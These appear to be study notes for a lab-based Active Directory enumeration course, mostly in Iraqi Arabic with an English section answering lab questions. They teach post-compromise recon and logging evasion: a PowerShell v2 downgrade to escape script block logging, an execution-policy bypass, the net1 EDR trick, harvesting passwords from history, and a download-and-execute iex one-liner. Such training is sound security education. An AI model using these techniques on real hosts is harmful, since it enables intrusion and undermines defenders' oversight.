Script Block Logging (تسجيل الكود البرمجي)

- شنو يعني؟ ميزة بـ PowerShell (من إصدار 3 فما فوق) تسجل حرفياً كل كود أو أمر ينكتب بالشاشة، حتى لو الكود مشفر، راح تفك تشفيره وتسجله بملف (Log) حتى المدافع يقرأه بعدين.
    
- وين يظهر؟ بـ Event Viewer الخاص بالويندوز (Event ID 4104).
    
- مثال: كأنما اكو كاميرا مراقبة مسلطة على الكيبورد مالتك، كل زر تضغطه يتسجل بالفيديو.
    

Downgrade Attack (هجوم خفض الإصدار)

- شنو يعني؟ إذا النظام بي ميزة حماية جديدة (مثل الكاميرا اللي فوك)، أنت تجبر النظام يشتغل بنسخة قديمة ما جانت بيها هاي الكاميرا أصلاً!
    
- وين يظهر؟ لما نستدعي powershell إصدار 2 بدل 5.
    
- مثال: إذا سيارتك الحديثة بيها GPS يراقب سرعتك، أنت تبدل سيارتك بسيارة موديل 1990 حتى محد يكدر يتبعك.
    

WMI (Windows Management Instrumentation)

- شنو يعني؟ هذا "العقل المدبر" لإدارة أجهزة الويندوز. لغة وبروتوكول يستخدمه مدراء النظام حتى يسحبون معلومات أو ينفذون أوامر على آلاف الأجهزة بالشبكة دفعة وحدة.
    
- وين يظهر؟ باستخدام أمر `wmic` بالشاشة السوداء.
    

LDAP Filtering (فلترة البحث ببروتوكول LDAP)

- شنو يعني؟ لما تدور على شي بـ Active Directory، ما تكدر تبحث مثل جوجل. لازم تكتب لغة بحث خاصة تشبه المعادلات، حتى تصفي النتائج.
    
- وين يظهر؟ بأوامر مثل `dsquery`، وتشوفها بشكل رموز غريبة مثل `(objectClass=user)`.
    
- مثال: كأنما تروح لدائرة النفوس وتكللهم: "أريد ملف كل شخص (ذكر) AND (عمره فوق الـ ٣٠) NOT (متزوج)".
    

Bitmask / OID (قناع البت / معرف الكائنات)

- شنو يعني؟ بالويندوز، خصائص اليوزر (مثل: الباسورد ما ينتهي، أو الحساب مقفول) ما تنخزن كنصوص، تنخزن كأرقام. الـ Bitmask هو الرقم السري اللي يمثل هاي الخاصية، والـ OID هو القاعدة اللي تترجم هذا الرقم.
    
- وين يظهر؟ بالبحث المتقدم بالـ AD.
    
- مثال: بدل ما النظام يكتب "هذا اليوزر ما يحتاج باسورد"، يكتب الرقم "32". وإنت لازم تبحث عن الرقم 32.

🟡 المرحلة 2: هيكل السكشن — شنو يعلّمك وكيف؟

📖 عنوان السكشن: Living Off the Land.

وهو جزء من موديول "Active Directory Enumeration & Attacks". يقع هذا السكشن بعد ما تكون تعلمت الأساسيات وأدوات الاستطلاع الخارجية. هسة يعلمك شلون تسوي نفس الشغل بس من "الداخل" وبدون أدوات.

🎯 أهداف السكشن (ماذا يريدك أن تتعلم؟):

1. إنك تستخرج معلومات تفصيلية عن الجهاز (Host) اللي أنت مخترقه حالياً بدون برامج خارجية.
    
2. إنك تتلاعب بالـ PowerShell وتعمي عيون المدافعين (Bypass Logging).
    
3. إنك تستكشف الشبكة وتعرف منو حولك.
    
4. إنك تستخرج بيانات الـ Active Directory باستخدام أدوات الويندوز الأصلية (Net, WMI, Dsquery).
    

📐 هيكل المحتوى (Section Blueprint):

السكشن مصمم كـ "رحلة منطقية" للمخترق أول ما يستلم شيل (Shell) على جهاز:

```
[مرحلة ١: استكشاف الجهاز (أنا وين؟)]
       │ (hostname, systeminfo, env)
       ▼
[مرحلة ٢: التخفي وتطويع PowerShell]
       │ (Downgrade, Bypass Execution, History)
       ▼
[مرحلة ٣: فحص الدفاعات والمراقبة]
       │ (Firewall, Defender, qwinsta)
       ▼
[مرحلة ٤: استكشاف الشبكة الجيران (منو يمي؟)]
       │ (arp -a, route print)
       ▼
[مرحلة ٥: الهجوم والاستطلاع للـ AD (الهدف الأكبر)]
         (WMI, Net commands, Dsquery)
```

🔗 المتطلبات السابقة:

- السكشن يفترض إنك فاهم أساسيات CMD و PowerShell.
    
- يفترض إنك تعرف شنو Active Directory، شنو Domain، وشنو Domain Controller.
    

⚠️ ما يذكره السكشن ضمنياً (الافتراضات المخفية):

السكشن يفترض إنك حصلت على صلاحيات معينة. بعض الأوامر هنا (مثل قراءة حالة الـ Defender من الـ CMD) قد تحتاج صلاحيات عالية (Administrator أو SYSTEM). أيضاً يفترض إن الشبكة اللي أنت بيها تسمح للأجهزة العادية تستعلم عن بيانات الـ Domain Controller، وهذا هو الـ Default بالويندوز (أي Domain User يكدر يقرا هواي أشياء).

تخيل نفسك صحيت من غيبوبة بغرفة مستشفى. أول الأسئلة اللي تسألها: أنا منو؟ شنو اسم المستشفى؟ شنو تاريخ اليوم؟ وأي دكتور يتابع حالتي؟ هاي الأوامر تسأل نفس الأسئلة للكمبيوتر.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الويندوز نظام معقد جداً وبي آلاف الملفات والمسارات. بدل ما البرامج تقعد تدور وين مجلد الـ Users، الويندوز يوفر (متغيرات بيئة - Environment Variables) جاهزة، تسحبها وتعرف الجواب بثانية. أما مسألة معرفة التحديثات (Hotfixes)، فهاي مهمة جداً إلك كهاكر، لأن إذا عرفت إن النظام ناقصه تحديث معين، تكدر تضربه بثغرة قديمة وترفع صلاحياتك (Privilege Escalation).

🔧 الأوامر:

DOS

```
systeminfo
echo %USERDOMAIN%
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

💬 شرح الـ flags:

- الكلمة `systeminfo` تجمعلك الكلاوات كلها بمكان واحد: نوع المعالج، إصدار الويندوز، اسم الجهاز.
    
- المتغير `%USERDOMAIN%` يقولك أنت تابع لأي نطاق (Domain).
    
- الكلمة `qfe` بداخل الـ wmic تعني (Quick Fix Engineering) وهو الاسم القديم لتحديثات الويندوز.
    

❓ الـ "بس ليش؟"

- "ليش أستخدم أوامر منفصلة إذا systeminfo ينطيني كل شي؟"
    
    سؤال ذكي. الـ `systeminfo` يجيب بيانات هواي وممكن يطول، ومرات أنظمة المراقبة (EDR) تعتبر تشغيل `systeminfo` مؤشر على وجود هاكر لأن الموظف العادي ما يكتبه. الأوامر الصغيرة مثل `echo %USERDOMAIN%` مستحيل تلفت الانتباه.
    

⏸️ نقطة توقف: هسة إحنا عرفنا اسم الجهاز والنظام والتحديثات اللي بي. صار وقت نتعمق ونستخدم السلاح الأقوى: PowerShell.

🔷 التقنية ٢: ترويض PowerShell والبحث بالقمامة (History)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

الباور شيل (PowerShell) هو أداة سحرية تكدر تسوي بيها أي شي بالويندوز. بس مرات النظام يمنعك تنفذ سكربتات، أو تحتاج تعرف الموظف اللي قبلك شنو كتب أوامر (لأن ممكن يكون كاتب باسورد مالته بالغلط بالشاشة).

🎭 التشبيه:

الـ Execution Policy هو مثل حارس أمن مول يگلك "ممنوع تدخل لابس شورت". أنت ببساطة تكله "أني مو زبون، أني عامل صيانة" (تغير الـ Scope)، ويفوتك. أما الـ History فهو مثل تفتيش سلة المهملات مال مكتب موظف، ممكن تلگى ورقة مكتوب عليها الباسورد!

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ Execution Policy صُمم لمنع المستخدم العادي من النقر المزدوج على سكربت خبيث بالخطأ. هو مو جدار حماية حقيقي، هو فقط حماية ضد الأخطاء غير المقصودة. لذلك مايكروسوفت نفسها تسمحلك تتجاوزه إذا حددت إن التجاوز يكون فقط لهذي الجلسة (Process) حتى ما يتغير إعداد النظام الدائمي ومحد يحس بيك.

🔧 الأوامر:

PowerShell

```
Set-ExecutionPolicy Bypass -Scope Process
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL');"
```

💬 شرح الـ flags:

- `Bypass`: يعني غلس، لا تمنع أي سكربت.
    
- `-Scope Process`: يعني هذا التغيير خليه فقط بهاي النافذة اللي فاتحها، من أسدها يرجع كلشي طبيعي (مهم جداً للتخفي).
    
- `-nop`: يعني No Profile، شغل الباور شيل بسرعة وبدون ما تحمل إعدادات اليوزر (حتى لا تضرب عليك سكربتات قديمة).
    
- `iex`: اختصار لـ Invoke-Expression، يعني "نفذ هذا النص كأنه كود".
    

📤 الـ Output المتوقع (لملف الهيستوري):

PowerShell

```
ipconfig
ping 8.8.8.8
net use X: \\fileserver\share /user:admin P@ssw0rd123!
```

لو قريت الهيستوري وشفت السطر الأخير... مبروك! الـ Sysadmin الغبي كتب الباسورد مالته كـ نص مكشوف بالـ terminal، والباور شيل خزنه بالـ history. هسة أنت عندك باسورد الأدمين!

🔷 التقنية ٣: التعمية وهجوم خفض الإصدار (Downgrade Attack)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

الباور شيل الحديث (نسخة 5 فما فوق) بي كاميرا مراقبة قوية جداً تسجل كل كود تكتبه. هسة إحنا نريد نشتغل بدون ما هاي الكاميرا تصورنا. شنسوي؟ نرجع بالزمن! نشغل نسخة باور شيل قديمة (نسخة 2) اللي هي أصلاً ما بيها كاميرا.

🎭 التشبيه:

تخيل أنت هربت من السجن والشرطة تلاحقك بكاميرات الوجوه الذكية اللي بالشوارع الجديدة. أنت شتسوي؟ تدخل بالأزقة القديمة جداً اللي ما وصلتها الكاميرات بعد.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

مايكروسوفت ضافت ميزة "Script Block Logging" بالإصدار 3. هاي الميزة رهيبة للمدافعين. بس المشكلة (أو الميزة الك) إن الويندوز، لأسباب التوافق مع التطبيقات القديمة، يحتفظ بنسخة قديمة من PowerShell (v2) مخفية داخل النظام. إذا أنت طلبت تشغيلها، راح تشتغل بـ Engine قديم ما يدعم التسجيل، فتصير كل حركاتك بعد هاي اللحظة مخفية تماماً عن ملفات الـ Event Viewer.

🔷 التقنية ٤: فحص الدفاعات و "هل أنا وحدي؟" (Defenses & qwinsta)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

قبل ما تبدأ تسوي ضجة، لازم تعرف شغلتين: هل الـ Antivirus شغال ويفحص الملفات؟ وهل اكو موظف أو أدمن ثاني مسجل دخول بهاي الحاسبة بنفس اللحظة؟ إذا اكو أحد، وتطلعله شاشة سوداء فجأة، راح يطفي الحاسبة ونفقد اختراقنا.

🎭 التشبيه:

مثل اللص اللي يدخل بيت. أول شي يباوع على جهاز الإنذار (Defender) هل هو معلوگ لو مطفي؟ وثاني شي يتسمع، هل اكو أحد نايم بالغرفة لو البيت فارغ؟ (qwinsta).

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ `qwinsta` (Query Window Station) أداة قديمة بالويندوز تجيبلك الجلسات (Sessions) المفتوحة. أما الـ `Get-MpComputerStatus` فهو يسحب كل إعدادات الـ Windows Defender الحالية من نواة النظام حتى تعرف بالضبط متى آخر مرة صار فحص، وهل ميزة الحماية بالوقت الفعلي (Real-time protection) شغالة لو لا.

🔧 الأوامر:

PowerShell

```
qwinsta
sc query windefend
Get-MpComputerStatus
```

💬 شرح الـ flags:

- `sc query`: يسال خدمة الويندوز (Service) عن حالتها هل هي (Running) لو (Stopped).
    
- `Get-MpComputerStatus`: يجيبلك تفاصيل الـ Defender المملة.
    

🔍 كيف تقرأ الـ Output؟

بالنسبة لـ qwinsta، دور على السطور اللي حالتها `Active`. إذا شفت غيرك `Active`، اتصرف بحذر شديد!

بالنسبة للـ Defender، أهم سطر هو `RealTimeProtectionEnabled`. إذا كان True، يعني أي ملف خبيث تنزله راح ينحذف بثانية.

🔷 التقنية ٥: استكشاف الشبكة (Network Recon)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

أنت هسة محبوس داخل حاسبة، تريد تعرف هاي الحاسبة المن تكدر توصل؟ هل تكدر توصل لسيرفر قواعد البيانات؟ هل هي متصلة بشبكة ثانية مخفية؟ الجواب نلقاه بذاكرة الحاسبة نفسها (جدول التوجيه وجدول الـ ARP).

🎭 التشبيه:

تخيل أنت خطفت تليفون شخص، وتريد تعرف منو أصدقاءه اللي يحاجيهم دايماً. ما تروح تسأل شركة الاتصالات، بس تفتح "سجل المكالمات الأخير" بالتليفون! هذا هو الـ ARP table.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

أي حاسبة بالشبكة حتى تحاجي حاسبة ثانية، لازم تعرف الـ MAC Address مالتها. فتحفظه بجدول مؤقت اسمه `ARP Cache`. إذا قرينا هذا الجدول، راح نعرف كل الأيبيهات (IPs) اللي هاي الحاسبة تواصلت وياها مؤخراً. أما ה`Routing Table` فهو الخريطة اللي تكول للحاسبة "إذا تريدين تروحين لشبكة 10.10.0.0، اطلعي من هذا الباب". هاي الخريطة تنطيك أفكار وين تكدر تسوي Pivot (انتقال لشبكة أعمق).

🔧 الأوامر:

PowerShell

```
arp -a
route print
```

📤 الـ Output المتوقع (للـ route print):

Plaintext

```
Network Destination        Netmask          Gateway       Interface
      0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25
   10.129.0.0      255.255.0.0         On-link    10.129.201.234
```

🔍 كيف تقرأ الـ Output؟

هنا السر! ركز على السطر الثاني. الحاسبة متصلة بشبكتين: شبكة `172.16.x.x` وشبكة `10.129.x.x`. هاي كنز! معناه أنت هسة بهذي الحاسبة تمثّل "جسر" لشبكة داخلية ثانية (10.129) قد تكون معزولة عن العالم الخارجي.

🔷 التقنية ٦: الاستجواب بـ WMI وأوامر Net

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

الـ Active Directory هو القلب مال الشركة. إحنا نريد نسأله: منو الأدمينية؟ شنو الجروبات الموجودة؟ منو متصل وين؟ نكدر نسوي هذا الشيء بأدوات بسيطة مثل `net` أو أداة معقدة مثل `wmic`.

🎭 التشبيه:

الـ `net` commands مثل واحد يروح يسأل استعلامات الشركة: "منو مديركم؟ منو يشتغل بالحسابات؟". أما الـ WMI فهو مثل واحد اخترق نظام الاتصالات مال الشركة وكام يسحب ملفات الـ HR كلها عن بُعد.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ Domain Controllers (سيرفرات الإدارة) مصممة حتى تجاوب على استفسارات المستخدمين العاديين. يعني أي يوزر (حتى لو موظف بسيط) من حقه يطلب قائمة بكل المستخدمين بالشبكة! الويندوز يوفر برنامج `net.exe` حتى يتواصل ويه الـ Domain ويسحب هاي البيانات.

🔧 الأوامر:

DOS

```
net group /domain
net user Administrator /domain
wmic ntdomain get Caption,DomainControllerAddress
```

💬 شرح الـ flags:

- `/domain`: هذا السويتش السحري. إذا ما كتبته، راح يبحث بالحاسبة المحلية (Local). إذا كتبته، الحاسبة راح تخابر الـ Domain Controller وتجيبلك المعلومات من الشبكة كلها.
    

❓ الـ "بس ليش؟"

- "السكشن ذكر حيلة اسمها `net1` بدال `net`، ليش؟"
    
    الـ EDR (أنظمة الحماية) ذكية، مسوية قاعدة: "إذا شفت أداة `net.exe` اشتغلت، اضرب جرس إنذار". الهاكرز اكتشفوا إن مايكروسوفت خالة نسخة احتياطية من الأداة اسمها `net1.exe` تسوي نفس الشغل بالضبط! والـ EDR الغبي مرات ينسى يراقب `net1` ويراقب بس `net`. خدعة بسيطة بس فعالة جداً.
    

⏸️ نقطة توقف: استجوبنا الـ AD بالأساسيات. هسة راح نتعلم لغة الـ AD الأصلية: LDAP.

🔷 التقنية ٧: البحث العميق بـ Dsquery و LDAP

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

هذي أقوى أداة بالسكشن. بدل ما نسأل أسئلة عامة (منو اليوزرات؟)، نكدر نسأل أسئلة خطيرة ومحددة جداً: "جيبلي كل اليوزرات اللي الباسورد مالتهم ما ينتهي أبداً ومقفول حسابهم". هذا البحث يتم بأداة مخفية بالويندوز اسمها `dsquery`.

🎭 التشبيه:

بدل ما تطلب دليل التليفونات وتقراه صفحة صفحة، كأنما عندك داتابيس تكدر تسوي بيها فلترة: جيبلي بس الأشخاص اللي ساكنين ببغداد، أعمارهم ٢٠، واسمهم يبدي بحرف ميم.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ Active Directory مبني على بروتوكول اسمه LDAP (Lightweight Directory Access Protocol). كل شي بالـ AD هو عبارة عن Object (كائن) وبي Attributes (خصائص). بعض الخصائص المهمة جداً (مثل إعدادات الحماية مال اليوزر) مخزونة بحقل واحد اسمه `userAccountControl`. هذا الحقل ما يكتبلك "الحساب مقفول"، بل يخزن رقم يجمع كل الحالات (Bitmask). هنا يجي دور الـ LDAP filters اللي تستخدم أرقام سحرية (OIDs) حتى تفك تشفير هذا الرقم وتلگى هدفك.

🔧 الأمر الجبار:

PowerShell

```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -attr sAMAccountName
```

💬 شرح الـ فلاتر (LDAP Magic):

- `*`: يعني ابحث بكل الـ Directory.
    
- `&`: يعني (AND)، كل الشروط اللي بين الأقواس لازم تتحقق.
    
- `objectCategory=person` و `objectClass=user`: دا أكوله ديربالك، أريد فقط حسابات يوزرات حقيقية (مو حاسبات ولا طابعات).
    
- `userAccountControl:1.2.840.113556.1.4.803:=8192`: هذا هو السحر. الرقم `1.2.840.113556.1.4.803` (الـ OID) يكول للـ AD: "افتحلي صندوق الـ UAC، وشوفلي البتات (Bits) اللي بي". الرقم `8192` يمثل يوزر عنده مشكلة معينة أو صلاحية معينة (هنا تمثل حساب Domain Controller). إذا الرقم طابق، جيبلي هذا اليوزر.
    
- `-attr sAMAccountName`: يعني من تلگى اليوزر، لا تجيبلي كل معلوماته، جيبلي بس اسمه المستعار (Username).
    

📊 ملخص ما تعلمناه ببحث الـ LDAP:

|**المفهوم / الرمز**|**ما يعني**|**متى تستخدمه**|
|---|---|---|
|`&`|AND (كل الشروط لازم تطابق)|لما تريد تضيق البحث بشكل كبير.|
|`\|`|OR (أي شرط يكفي)|لما تبحث عن حساب من نوعين مختلفين.|
|`!`|NOT (استثناء)|لما تريد كل اليوزرات _ما عدا_ المقفولين.|
|`1.2.840.113556.1.4.803`|OID للمطابقة الدقيقة|لما تبحث عن خاصية محددة بالضبط (Bitwise AND).|

🔴 المرحلة 4: ما لا يقوله السكشن

هنا الحجي المبطن اللي لازم تعرفه كـ Pentester حقيقي، لأن HTB يشرحلك الأداة بس مرات ما يگلك مشاكلها الواقعية.

🕳️ الثغرات في شرح السكشن (اللي ما ذكروها الك):

1. **الـ Noise (الضجيج) مال `net` commands:** السكشن يگلك استخدم `net user /domain`. بس ما يگلك إنه بمجرد أن تضغط Enter، حاسبتك راح تفتح اتصال (SMB/RPC) مباشر مع الـ Domain Controller! ببيئات الـ Enterprise المراقبة، هذا الاتصال من حاسبة موظف عادي (مثلاً بقسم المبيعات) إلى الـ DC، وبكميات كبيرة، راح يخلي الـ SOC (فريق الحماية) يشتغل عندهم إنذار أحمر فوراً. هاي الحركة مو هادئة (Stealthy) مثل ما تتخيل.
    
2. **خدعة `net1` انتهت صلاحيتها:** السكشن يذكرلك `net1` كـ Workaround (حيلة). بالواقع، وبسنة ٢٠٢٤، أغلب أنظمة الـ EDR الحديثة (مثل CrowdStrike و Defender for Endpoint) صاروا يسوون Block للـ `net1` بالضبط مثل ما يسوون للـ `net`. لا تعتمد عليها كمنقذ دائم.
    
3. **جريمة خفض الإصدار (Downgrade):** السكشن يگلك نزل إصدار الـ PowerShell لـ 2 حتى ما تتسجل أوامرك. بس اللي ما ركز عليه كفاية: عملية كتابة `powershell -version 2` بحد ذاتها راح تولد Event بالويندوز (Event ID 400). مجرد ظهور هذا الحدث هو Indicator of Compromise (IoC) خطير جداً. الـ Sysadmin الذكي راح يسأل: "ليش حاسبة الموظف فجأة شغلت الباور شيل موديل ٢٠٠٩؟".
    

⚠️ الـ Gotchas عند تطبيق هذا بالـ Lab:

- **الصلاحيات:** مرات تشغل أمر `dsquery` ويطلعلك Error. هذا مو لأن الأداة خربانة، بل لأن الـ User اللي أنت مخترقه ماعنده صلاحية (Query) على الـ OU المعينة بالـ Active Directory (بعض الشركات تقفل هاي الصلاحية وما تخليها Default).
    
- **الـ WMI بطيء:** إذا استخدمت `wmic` حتى تسحب لستة بروسسات من حاسبة عن بعد بالشبكة، ممكن يطول أو يعلك (Hang) إذا الحاسبة بيها Firewall قوي.
    

🔗 ربط بسكاشن أخرى:

موضوع الـ LDAP Filtering (أرقام الـ OID والـ Bitmasks) اللي أخذناه بنهاية السكشن، راح ترجعله بشكل مخيف وموسع بموديول "BloodHound" وموديول "Active Directory LDAP". اللي تعلمته هنا كـ Command Line راح تشوفه هناك كـ Graph مرئي.

🌍 السياق الحقيقي (Real Pentest Context):

بالحياة الواقعية، من تستلم Shell، أول نصيحة: **لا تسوي شي لمدة ١٠ دقائق!** استخدم `qwinsta` و `systeminfo` فقط. اقرأ وين أنت. لا تبدأ تسوي `net user /domain` وأنت ما تدري هل الـ Defender شغال بوضع الـ Aggressive لو لا. הـ LotL هو فن الهدوء.

🏆 النصيحة الذهبية لـ CPTS Exam:

بامتحان الـ CPTS، مرات راح توگع بحاسبة ما تكدر تنزل بيها BloodHound أو SharpHound لأن الـ AV ياكلها فوراً. هنا راح تضطر تعتمد ١٠٠٪ على `dsquery` و `wmic` حتى تطلع الـ Domain Admins وتعرف طريقك للروت. لا تستهين بهاي الأدوات، هي اللي راح تفكلك العقدة بالامتحان.

# QUESTION 1: Find the AMProductVersion

---

## 1\. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

### Re-stating the Question Simply

You've connected to a Windows computer via RDP (Remote Desktop Protocol — basically, you're controlling someone else's screen remotely). You need to find the **AMProductVersion**, which is the version number of **Windows Defender** (the antivirus software) installed on that machine.

### What is AMProductVersion?

Term

Meaning

**AM**

Anti-Malware

**Product**

The software itself (Windows Defender)

**Version**

The version number, like `4.18.2202.4`

Think of it like checking the version number on your phone's antivirus app.

### The Hacker's Mindset

As a penetration tester, knowing the **antivirus version** tells you:

-   Is it up-to-date? (Outdated AV = more vulnerabilities to exploit)
-   What features are active? (Is real-time protection on?)
-   Is it in a degraded state? (Can we bypass it?)

### Why This Tool? — Core Justification

Windows has a built-in PowerShell command called `Get-MpComputerStatus`. The `Mp` stands for **Microsoft Protection** (Defender). This command is native — it requires **no downloads**, no extra tools, and works on any modern Windows system. Perfect for "Living Off the Land."

---

## 2\. SIX DISTINCT SOLUTION APPROACHES

### 🔵 Approach 1 — Direct PowerShell (Simplest & Recommended)

**Command:**

powershell

```
Get-MpComputerStatus
```

**Expected Output:**

```
AMEngineVersion                  : 1.1.19000.8
AMProductVersion                 : 4.18.2202.4      <-- THIS IS YOUR ANSWER
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2202.4
AntispywareEnabled               : True
AntivirusEnabled                 : True
...
```

Your answer is the number next to `AMProductVersion`.

**Failure Scenarios:**

-   PowerShell execution policy blocks the command
-   Windows Defender service is disabled entirely
-   Running as a low-privilege user without rights to query WMI

**Pivot Trigger:**  
If you see a `PermissionDenied` error OR the command returns nothing, stop and move to Approach 2.

---

### 🔵 Approach 2 — Filter Only the Version (Cleaner Output)

**Command:**

powershell

```
Get-MpComputerStatus | Select-Object AMProductVersion
```

**Expected Output:**

```
AMProductVersion
----------------
4.18.2202.4
```

This strips out everything except the exact field you need.

**Failure Scenarios:**

-   If `Get-MpComputerStatus` isn't available (very old Windows or Defender removed), `Select-Object` also fails
-   If Defender is not installed, the entire `Defender` module won't load

**Pivot Trigger:**  
If you see `Get-MpComputerStatus : The term 'Get-MpComputerStatus' is not recognized`, move to Approach 3.

---

### 🔵 Approach 3 — Using WMI (Windows Management Instrumentation)

**Command (from PowerShell or CMD):**

powershell

```
wmic /namespace:\\root\Microsoft\Windows\Defender path MSFT_MpComputerStatus get AMProductVersion
```

**Expected Output:**

```
AMProductVersion
4.18.2202.4
```

**Why this works:** WMI is a deep system management layer in Windows. Even if PowerShell cmdlets fail, WMI can often still query the same data through a different pathway.

**Failure Scenarios:**

-   `wmic` is deprecated in newer Windows 11 builds
-   WMI service (`Winmgmt`) is stopped
-   Namespace `\root\Microsoft\Windows\Defender` doesn't exist if Defender is completely uninstalled

**Pivot Trigger:**  
If you see `Invalid namespace` or `No Instance(s) Available`, move to Approach 4.

---

### 🔵 Approach 4 — Registry Query (Bypasses Service Dependencies)

**Command:**

cmd

```
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender" /v ProductVersion
```

**Expected Output:**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender
    ProductVersion    REG_SZ    4.18.2202.4
```

**Why this works:** Windows Defender writes its version to the **Registry** — the giant settings database of Windows. Even if the Defender _service_ is off, the registry key may still hold the version information.

**Failure Scenarios:**

-   Registry key path varies between Windows versions
-   Insufficient privileges to read `HKLM` (HKEY\_LOCAL\_MACHINE)
-   Third-party AV replaced Defender and the key doesn't exist

**Pivot Trigger:**  
If you see `ERROR: The system was unable to find the specified registry key or value`, move to Approach 5.

---

### 🔵 Approach 5 — Check the Executable File Directly

**Command:**

powershell

```
(Get-Item "C:\Program Files\Windows Defender\MpCmdRun.exe").VersionInfo.ProductVersion
```

**Expected Output:**

```
4.18.2202.4
```

**Why this works:** The Defender executable file itself has version metadata embedded in it — just like how you can right-click a `.exe` file on Windows and check "Properties > Details > Product Version."

**Failure Scenarios:**

-   Defender files installed in a different path (can vary)
-   File permissions prevent reading the executable
-   Defender completely removed (no file to check)

**Pivot Trigger:**  
If you see `Cannot find path` or an empty result, move to Approach 6.

---

### 🔵 Approach 6 — Advanced: PowerShell Module Direct Query

**Command:**

powershell

```
Import-Module Defender
(Get-MpComputerStatus).AMProductVersion
```

**Expected Output:**

```
4.18.2202.4
```

**Why this is different:** This explicitly imports the Defender PowerShell module first before running the command. This is useful if auto-loading is disabled but the module files still exist on disk.

**Failure Scenarios:**

-   Module path not in `$PSModulePath`
-   Script block logging alerts a defender (ironically) to your activity
-   Module files corrupted or removed

**Pivot Trigger:**  
If `Import-Module Defender` returns an error like `Module not found`, you've exhausted native Defender queries. Document your findings and move to the next task.

---

## 3\. THE "WHAT IF" MASTERCLASS

🔴 What If #1: PowerShell says "Execution Policy" blocked the command?

**Scenario:** You get this error:

```
File cannot be loaded because running scripts is disabled on this system.
```

**Solution:** Bypass the execution policy for your current session only (this does NOT permanently change the system):

powershell

```
Set-ExecutionPolicy Bypass -Scope Process -Force
Get-MpComputerStatus
```

The `-Scope Process` means it only affects your current PowerShell window and resets when you close it.

🔴 What If #2: The command exists but returns nothing?

**Scenario:** `Get-MpComputerStatus` runs without error but the output is blank.

**Solution:** The Defender service may be stopped. Check its state first:

cmd

```
sc query windefend
```

If `STATE` shows `STOPPED`, Defender is disabled. You can still query the registry (Approach 4) for the installed version even when the service isn't running.

🔴 What If #3: You're on a very old Windows system (pre-Windows 10)?

**Scenario:** The `Defender` module doesn't exist at all because the system uses older Microsoft Security Essentials or no AV.

**Solution:** Check for the older Security Essentials path:

cmd

```
reg query "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware" /v ProductVersion
```

Or check running processes for what AV is installed:

powershell

```
wmic process get name,executablepath | findstr -i "antivirus\|defender\|mcafee\|symantec\|norton"
```

🔴 What If #4: A third-party antivirus replaced Windows Defender?

**Scenario:** Kaspersky, McAfee, or CrowdStrike is installed instead. `Get-MpComputerStatus` still runs but shows Defender in a "passive mode" with minimal info.

**Solution:** Look for what's actually running:

powershell

```
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
```

This queries the **Security Center** which tracks ALL registered security products, not just Defender. Output will show `displayName` and `productVersion` for whatever AV is active.

🔴 What If #5: You only have CMD access, not PowerShell?

**Scenario:** PowerShell is blocked or restricted. You only have a regular `cmd.exe` prompt.

**Solution:** Use the WMI command-line approach from Approach 3, or use the registry query from Approach 4. Both work from standard `cmd.exe`:

cmd

```
wmic /namespace:\\root\Microsoft\Windows\Defender path MSFT_MpComputerStatus get AMProductVersion
```

🔴 What If #6: You want to minimize logs while running this command?

**Scenario:** The environment has aggressive monitoring. You don't want to trigger alerts.

**Solution:** Use the **PowerShell downgrade trick** from the module material. Start PowerShell version 2 (which lacks script block logging) before running your query:

cmd

```
powershell.exe -version 2 -command "Get-MpComputerStatus | Select-Object AMProductVersion"
```

⚠️ **Warning:** The action of running `-version 2` itself will be logged as one final entry, then logging stops. Be aware that a vigilant defender may notice the sudden stop in logs.

# QUESTION 2: Find the Domain User in Local Administrators

---

## 1\. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

### Re-stating Simply

Every Windows computer has a **local Administrators group** — a special list of users who have full control over that one specific computer. Usually you'd find:

-   The built-in `Administrator` account
-   Maybe a domain admin group added globally

The question asks: **Which specific domain user account** (not a group — a single user) is **explicitly** added to this local group?

### Key Vocabulary

Term

Meaning

**Local group**

A group that exists on ONE computer only

**Domain user**

A user account that belongs to the company-wide Active Directory, not just one computer

**Explicitly listed**

Added directly by name, not inherited through group membership

### The Hacker's Mindset

Finding local admins is **critical** in penetration testing because:

-   Local admins can install software, read all files, dump password hashes
-   If we compromise a domain user who is also a local admin on multiple machines, we can **move laterally** across the network
-   This is a classic privilege escalation path

### Core Justification

The `net localgroup administrators` command is the fastest, most reliable native Windows tool to list local group members. It requires no special tools and works from both CMD and PowerShell.

### 🔵 Approach 1 — Net Command (Fastest, Classic)

Look for lines formatted as `DOMAINNAME\username` — those are domain accounts. Your answer is the specific **user** (not a group like "Domain Admins").

## 3\. THE "WHAT IF" MASTERCLASS

🔴 What If #1: The output shows groups but not individual users?

**Scenario:** You see `INLANEFREIGHT\Domain Admins` but no individual user. You need to find which individual user is _explicitly_ (directly) added.

**Solution:** The key word is "explicitly." Domain groups added to local admins are expected. Run the command and look for entries that are:

